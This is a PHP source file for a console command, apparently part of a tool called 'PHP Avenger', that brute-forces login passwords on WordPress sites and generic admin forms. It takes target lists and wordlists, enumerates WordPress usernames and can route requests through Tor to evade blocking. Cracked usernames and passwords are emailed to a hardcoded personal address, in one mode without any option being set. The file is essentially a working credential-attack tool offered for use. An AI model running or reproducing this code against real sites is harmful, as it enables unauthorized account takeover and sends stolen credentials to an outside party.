<?php
namespace Avenger\Controller;

use Knp\Command\Command;
//use Symfony\Component\Console\Event\ConsoleExceptionEvent;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Input\InputDefinition;
use Symfony\Component\Console\Helper\Table;
use Symfony\Component\Console\Helper\ProgressBar;
use Respect\Validation\Validator as v;
use Aszone\WordPress\WordPress;
use Aszone\Site\Site;
use Service\Mailer;
use Service\GuzzleTor;



class BruteForceController extends Command{



    protected function configure() {
        $this
          	->setName("brute-force")
          	->setDescription("Brute force online single site or list of site")            
			->setDefinition(
                new InputDefinition(array(
                    new InputArgument(
                    	'type',
                    	InputArgument::REQUIRED,
                    	'What type? Example:  anywhere ,wordpress , joomla , drupal'),
                    new InputArgument(
                        'target',
                        InputArgument::REQUIRED,
                        'What target? Example: http://www.target.com, /home/foo/listOfTargets.txt'),
                    new InputOption(
                        'username',
                        'u',
                        InputOption::VALUE_REQUIRED,
                        'What username?. Example: admin, or /home/foo/usernamelist.txt'),
                    new InputOption(
                        'wordlist',
                        'w',
                        InputOption::VALUE_REQUIRED,
                        'List of password. Example: /home/foo/wordlist.lst'),
                    
                   	new InputOption(
                    	'tor',
                    	null,
                    	InputOption::VALUE_NONE,
                    	'Set the hash. Example: --tor'),

                    new InputOption(
                        'email',
                        null,
                        InputOption::VALUE_NONE,
                        'Set the email for send result. Example: --email'),
                   	
                    /*new InputOption(
                    	'hashs',
                    	'hss',
                    	InputOption::VALUE_REQUIRED,8/
                    	'Set the file with list of hashs. Example: --hashs=/home/foo/hashs.lst'),*/
                
                ))
            )			
            ->setHelp('<comment>Command used to brute force</comment>');
    }

    protected function execute(InputInterface $input, OutputInterface $output) {
    	
        switch ($input->getArgument('type')) {
            case 'wordpress':
                $this->executeBruteForceWordPress($input, $output);
                break;
            case 'list-md5':
                $this->executeListMd5($input, $output);
                break;
            case 'all':
                $this->executeBruteForceAll($input, $output);
                break;
            /*case 'joomla':
                $this->executeMd5($input, $output);
                break;
            case 'list-joomla':
                $this->executeMd5($input, $output);
                break;
            */
            default:
                //throw new ComponentException('Cannot validate without filter flag');
                $output->writeln("<error>This is 'Type' is not exist, select md5, list-md5</error>");
                break;
        }
    	
    }

    /**
     * @param InputInterface $input
     * @param OutputInterface $output
     */
    protected function executeBruteForceWordPress(InputInterface $input, OutputInterface $output){

        //$wordlistClass = new Wordlist();
        //$dataBruteForceWordPress = new \StdClass;
        $target      = $input->getArgument('target');
        $username    = $input->getOption('username');
        $wordlist    = $input->getOption('wordlist');
        $optionTor   = $input->getOption('tor');
        $optionMail   = $input->getOption('mail');

        //verify if target is list or one
        $targets=$this->getTargetsInArray($target);

        //verify is wordlist and set wordlist default
        $wordlist=$this->getWordListInArray($wordlist);

        //Use Tor
        $tor=false;
        if($optionTor){
            $middleware = new GuzzleTor();
            $tor=$middleware->tor();
        }

        $resultFinal = array();

        if($targets!=false && $wordlist!=false){

            //CONFIG PROFRESSBAR
            $progress = new ProgressBar($output, count($wordlist)*count($targets) );
            $progress=$this->configBar($progress);

            foreach ($targets as $keyTarget => $valueTarget) {

                $output->writeln(""); 
                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");

                $wp = new WordPress($valueTarget);
                $wp->setTor($tor);


                //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
                $output->writeln("<info>Searching for users, wait...</info>");
                $usernames=$this->getUsernamesInArray($username,$wp);

                $output->writeln("<info></info>");
                $output->writeln("<info>".count($usernames)." of users...</info>");

                //VERIFY IS WORDPRESS
                $isWordPress=$wp->isWordPress();

                //VALIDATEE IF IS WORDPRESS AND EXIST USERNAMES
                if($isWordPress && $usernames!=false){
                    $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl($valueTarget);

                    foreach($usernames as $username){
                        $output->writeln("<info>Search password of ".$username."</info>");
                        foreach ($wordlist as $keyWordList => $valueWordList) {

                            $progress->advance();

                            $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress,$tor['proxy']);
                            //verify if is block and change ip of tor
                            if(($returnHtml['status']=='403')OR($returnHtml['status']=='500')OR($returnHtml['status']=='401')){
                                //change ip of tor

                            }

                            $validateLogon=$this->validateLogon($returnHtml['body']);

                            if($validateLogon){

                                $resultFinal[$keyTarget]['target']=$valueTarget;
                                $resultFinal[$keyTarget]['username']=$username;
                                $resultFinal[$keyTarget]['password']=$valueWordList;

                                $output->writeln("");
                                $output->writeln("<info>Login success</info>");
                                $output->writeln("<info>Target: ".$valueTarget."</info>");
                                $output->writeln("<info>Username: ".$username."</info>");
                                $output->writeln("<info>Password: ".$valueWordList."</info>");

                                $msg = "PHP Avenger Informer, SUCCESS:<br><br>";
                                $msg.= "Target =".$valueTarget."<br>";
                                $msg.= "Username =".$valueTarget."<br>";
                                $msg.= "Password =".$valueWordList."<br>";
                                if($optionMail){
                                    $mailer = new Mailer();
                                    $mailer->sendMessage('lenonleite@gmail.com',$msg);
                                }

                                break;
                            }

                        }
                    }
                }else{
                    $output->writeln("<error>Users not found or This site is not WordPress...</error>");
                }
            }
            $progress->finish();

            //SEND MAIL WITH RESULT FINAL
            if($optionMail){
                $this->sendMailWordPress($resultFinal);
            }

            //PRINT RESULT LIST FINAL
            $this->printResultWordPress($resultFinal,$output);
        }


        
    }

    protected function executeBruteForceAll(InputInterface $input, OutputInterface $output)
    {
        //$wordlistClass = new Wordlist();
        //$dataBruteForceWordPress = new \StdClass;
        $target      = $input->getArgument('target');
        $username    = $input->getOption('username');
        $wordlist    = $input->getOption('wordlist');
        $optionTor   = $input->getOption('tor');
        $optionMail   = $input->getOption('email');

        //verify if target is list or one
        $targets=$this->getTargetsInArray($target);

        //verify is wordlist and set wordlist default
        $wordlist=$this->getWordListInArray($wordlist);

        //Use Tor
        $tor=false;
        if($optionTor){
            $middleware = new GuzzleTor();
            $tor=$middleware->tor();
        }

        if($targets!=false && $wordlist!=false)
        {

            //CONFIG PROFRESSBAR
            $progress = new ProgressBar($output, count($wordlist) * count($targets));
            $progress = $this->configBar($progress);

            foreach ($targets as $keyTarget => $valueTarget)
            {
                $output->writeln("");
                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
                $site = new Site($valueTarget);
                $site->setTor($tor);
                //$resultIsJoomla=$site->isJoomla();
                $resultIsAdmin=$site->isAdmin();
                if($resultIsAdmin)
                {
                    $usernameField  = $site->getNameFieldUsername();
                    $passwordField  = $site->getNameFieldPassword();
                    $actionForm     = $site->getActionForm();
                    $methodForm     = $site->getMethodForm();
                    $excludeValues[]=$usernameField;
                    $excludeValues[]=$passwordField;
                    $otherFields=$site->getOthersField(array_merge($usernameField,$passwordField));
                    $resultOfBruteForce=$site->bruteForceAll($actionForm,$methodForm,$usernameField,$passwordField,$otherFields);
                    if($resultOfBruteForce)
                    {

                        $resultFinal[0]['target']=$valueTarget;
                        $resultFinal[0]['username']=$resultOfBruteForce['username'];
                        $resultFinal[0]['password']=$resultOfBruteForce['password'];
                        $this->sendMailWordPress($resultFinal);
                    }
                    //
                    //$methodForm     = $site->getMethodForm();
                }else{
                    echo "não é admin";
                }

            }
        }
        var_dump($resultFinal);


    }

    protected function sendDataToLoginWordPress($username,$password,$target,$tor=""){


        $cookie="cookie.txt";

        $postdata = "log=". $username ."&pwd=". $password ."&wp-submit=Log%20In&redirect_to=". $target ."wp-admin/&testcookie=1";
        $ch = \curl_init();
        curl_setopt ($ch, CURLOPT_URL, $target . "wp-login.php");
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt ($ch, CURLOPT_REFERER, $target . "wp-admin/");
        curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
        curl_setopt ($ch, CURLOPT_POST, 1);
        if(!empty($tor)){
            curl_setopt ($ch, CURLOPT_PROXY, $tor);
            curl_setopt ($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_VERBOSE, 0);
        }

        $result['body'] = curl_exec ($ch);
        $result['status']=curl_getinfo($ch);
        curl_close($ch);
        return $result;

    }

    protected function validateLogon($html){
        
        //preg_match("/<strong>(.+?)<\/strong>/", $html, $resultMatches, PREG_OFFSET_CAPTURE, 3);

        $pos = strpos($html, "<strong>ERRO</strong>");
        if($pos !== false){
           return false;
        }
        return true;
    }

    protected function getWordListInArray($wordlist=""){

        if(empty($wordlist)){
            $zip = new \ZipArchive;
            $zip->open('resource/wordlist.zip');
            $zip->extractTo('resource/tmp/');
            $zip->close();
            $wordlist    = 'resource/tmp/wordlist.txt';
            $arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
            unlink($wordlist);
            return $arrWordlist;
        }

        $checkFileWordList  = v::file()->notEmpty()->validate($wordlist);
        if($checkFileWordList){
            $targetResult   = file($wordlist,FILE_IGNORE_NEW_LINES);
            return $targetResult;
        }

        return false;

    }

    protected function getTargetsInArray($target){

        $targetIsFile   = v::file()->notEmpty()->validate($target);

        if($targetIsFile){
            $targetResult   = file($target,FILE_IGNORE_NEW_LINES);
            return $this->clearArrayEmpty($targetResult);
        }

        $targetIsUrl    = v::url()->notEmpty()->validate($target);

        if($targetIsUrl){
            $targetResult[0]=$target;
            return $targetResult;
        }

        return false;
    }

    protected function getUsernamesInArray($username,$wp){

        if(empty($username)){
            //VERIFY IF LIST TXT OR SEARCH IN WORDPRESS SITE
            $usernames=$wp->getUsers();
            if(empty($usernames)){
                return false;
            }
            return $usernames;
        }

        $usernameIsFile   = v::file()->notEmpty()->validate($username);
        if($usernameIsFile){
            $usernameResult   = file($username,FILE_IGNORE_NEW_LINES);
            return $this->clearArrayEmpty($usernameResult);
        }

        $usernames[0]=$username;
        return $usernames;

    }

    protected function clearArrayEmpty($targetResult){
        foreach($targetResult as $keyTarget=>$target){
            if(empty($target)){
                unset($targetResult[$keyTarget]);
            }
        }
        return $targetResult;
    }

    protected function configBar($progress){

        $progress->setBarCharacter('<comment>=</comment>');
        $progress->setFormat('verbose');
        $progress->setProgressCharacter('|');
        $progress->setBarWidth(100);
        $progress->setRedrawFrequency(50);
        $progress->start();

        return $progress;

    }

    protected function sendMailWordPress($resultFinal){
        //Send Mail with parcial results
        $mailer = new Mailer();
        if(empty($resultFinal)){
            $mailer->sendMessage('lenonleite@gmail.com',"Fail, not finder password in list. =\\");
        }else{
            $msg = "PHP Avenger Informer final, list of SUCCESS:<br><br>";
            foreach($resultFinal as $result){
                $msg.= "Target =".$result['target']."<br>";
                $msg.= "Username =".$result['username']."<br>";
                $msg.= "Password =".$result['password']."<br>";
            }
            $mailer->sendMessage('lenonleite@gmail.com',$msg);
        }
    }

    protected function printResultWordPress($resultFinal,$output){
        $output->writeln("");

        $table = new Table($output);

        $table->setHeaders(array('TARGET','USERNAME', 'PASSWORD'));

        $table->setRows($resultFinal);
        $table->render();
    }

}